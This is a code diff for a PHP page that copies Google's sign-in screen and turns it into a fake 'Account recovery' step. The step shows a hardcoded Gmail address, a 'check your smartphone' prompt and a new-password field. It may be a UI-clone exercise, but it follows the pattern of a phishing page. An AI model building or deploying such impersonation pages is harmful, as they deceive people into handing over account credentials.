@@ -7,31 +7,29 @@ $title="Login to google accounts";
     <div class="group-align">
         <div class="group-title">
             <img src="assets/images/pngwing.com.png" alt="logo google">
-            <h2>Sign in</h2>
-            <p>Use your Google Account</p>
+            <h2>Account recovery</h2>
+            <div class="title-p">
+                <p>To help keep your account safe, Google wants to make sure it’s really you trying to sign in</p>
+            </div>
+            <div class="user-email">
+                <ion-icon name="person-circle-outline"></ion-icon>
+                <p>profissao33@gmail.com</p>
+            </div>
         </div>
-        <div class="group-i" id="group-signin-email">
+        <div class="group-i" id="recover-password">
             <div class="containeri-x">
-                <div class="fieldset-row-2">
-                    <div class="align-i">
-                        <fieldset id="error-9">
-                            <legend>Email or phone</legend>
-                            <input type="text" id="9" name="user-email">
-                        </fieldset>
-                        <span id="msg-9">Obrigatório</span>
-                    </div>
+                <div class="group-image-x">
+                    <img src="<?=$base;?>/assets/images/cel.gif" height="100">
                 </div>
-                <div class="link">
-                    <a href="<?=$base;?>/recover-email.php">Forgot Email?</a>
-                </div>
+                <div class="link"></div>
                 <div class="access-i">
-                    <p>Not your computer? Use Guest mode to sign in privately.
-                        <a href="<?=$base;?>/">Learn more</a>
-                    </p>
+                    <p>Check your smartphone</p>
+                    <p>Google sent a notification to your smartphone. Tap Yes on the notification to verify it’s you.
+</p>
                 </div>
                 <div class="group-row">
                     <div class="col-acess-2">
-                        <a href="<?=$base;?>/signup.php">Create account</a>
+                        <a href="<?=$base;?>/signup.php">Resend it</a>
                     </div>
                     <div class="col-acess-2 align-i">
                         <button id="button-signin-email" type="button">Next</button>
@@ -39,15 +37,15 @@ $title="Login to google accounts";
                 </div>
             </div>
         </div>
-        <div class="group-i" id="group-signin-password">
+        <div class="group-i">
             <div class="containeri-x">
                 <div class="fieldset-row-2">
                     <div class="align-i">
-                        <fieldset id="error-10">
+                        <fieldset >
                             <legend>Your password</legend>
-                            <input type="password" id="10" placeholder="Enter Your Password" name="user-password">
+                            <input type="password" placeholder="Enter Your new Password" name="new-password">
                         </fieldset>
-                        <span id="msg-10">Obrigatório</span>
+                        <span>Obrigatório</span>
                     </div>
                 </div>
                 <div class="link">
@@ -59,7 +57,7 @@ $title="Login to google accounts";
                         <a href="<?=$base;?>/alter_password.php">Forgout password</a>
                     </div>
                     <div class="col-acess-2 align-i">
-                        <button id="button-signin-password" type="button">Next</button>
+                        <button type="button">Next</button>
                     </div>
                 </div>
             </div>
